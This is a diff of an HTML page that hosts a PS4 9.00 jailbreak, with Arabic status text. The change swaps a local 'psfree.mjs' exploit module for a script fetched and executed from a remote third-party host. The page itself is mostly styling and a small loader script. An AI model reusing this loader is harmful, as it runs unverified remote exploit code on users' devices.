@@ -45,10 +45,8 @@
       font-weight: bold; color: #fff; border-radius: 14px;
       cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 127, 0.4);
       margin-bottom: 15px; width: 100%; text-transform: uppercase;
-      transition: transform 0.1s ease;
     }
-    .btn-jb:active { transform: scale(0.97); }
-    .status { font-size: 1.1rem; color: #00f0ff; margin-top: 15px; font-weight: bold; min-height: 30px; }
+    .status { font-size: 1.1rem; color: #00f0ff; margin-top: 15px; font-weight: bold; }
     .insta-box {
       display: inline-block;
       background: rgba(255, 255, 255, 0.05);
@@ -64,7 +62,7 @@
     <h1>AMORABK / SHAHM</h1>
     <div class="subtitle">PS4 9.00 Jailbreak Host</div>
     
-    <button class="btn-jb" id="jbBtn" onclick="triggerExploit()">تفعيل الثغرة</button>
+    <button class="btn-jb" id="jbBtn" onclick="runExploit()">تفعيل الثغرة</button>
     <div class="status" id="statusText">جاهز للتشغيل</div>
 
     <br>
@@ -74,24 +72,24 @@
   </div>
 
   <script>
-    function triggerExploit() {
+    function runExploit() {
       var btn = document.getElementById('jbBtn');
       var status = document.getElementById('statusText');
       
       btn.style.display = 'none';
-      status.innerText = "جاري تهيئة الذاكرة وحقن الثغرة...";
-      
-      // تأخير بسيط لضمان تحديث الواجهة على الشاشة قبل بدء ثغرة الكيرنل الثقيلة
-      setTimeout(function() {
-        var script = document.createElement('script');
-        script.src = "psfree.mjs";
-        script.type = "module";
-        script.onerror = function() {
-          status.innerText = "فشل تحميل ملف الثغرة (تأكد من وجود psfree.mjs)";
-          btn.style.display = 'block';
-        };
-        document.body.appendChild(script);
-      }, 400);
+      status.innerText = "جاري تحميل وتفعيل الثغرة...";
+
+      // استدعاء السكريبت المباشر المتوافق تماماً مع الـ PS4
+      var script = document.createElement('script');
+      script.src = "https://ps4.tarunas.dev/900/psfree.js"; // أو السكريبت الأساسي المستقر
+      script.onload = function() {
+        status.innerText = "تم حقن الثغرة بنجاح! يرجى إدخال الفلاشة.";
+      };
+      script.onerror = function() {
+        status.innerText = "فشل الاتصال، تحقق من الشبكة.";
+        btn.style.display = 'block';
+      };
+      document.body.appendChild(script);
     }
   </script>
 </body>
